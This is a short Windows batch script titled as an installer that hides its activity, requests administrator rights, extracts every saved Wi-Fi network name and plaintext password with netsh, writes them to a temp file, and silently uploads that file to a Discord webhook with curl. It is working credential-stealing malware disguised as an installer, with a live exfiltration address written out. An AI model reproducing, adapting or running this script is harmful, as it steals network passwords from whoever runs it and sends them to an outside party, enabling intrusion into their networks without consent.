@echo off
title Installer...
powershell -Command -windowstyle hidden "Start-Process cmd.exe -Verb RunAs"

if %errorlevel% NEQ 0 (
    exit /b
)

set dest=%temp%
set filename=wifi_password.txt

setlocal enabledelayedexpansion
FOR /F "tokens=2 delims=:" %%G IN ('netsh wlan show profiles') DO (
  SET _temp=%%G
  SET wifiname=!_temp:~1!
  netsh wlan show profile "!wifiname!" key=clear>> "%dest%\%filename%"
)
endlocal

curl -X POST -F "file=@%dest%\%filename%" https://discord.com/api/webhooks/1260225925765664770/awIkXTY_0y_0JZWesqDE7y6lJi0DPKzRqZCumRfUSQkYcrz1tev5CvSXLwR7UFXEwwZg >nul 2>&1

exit /b 0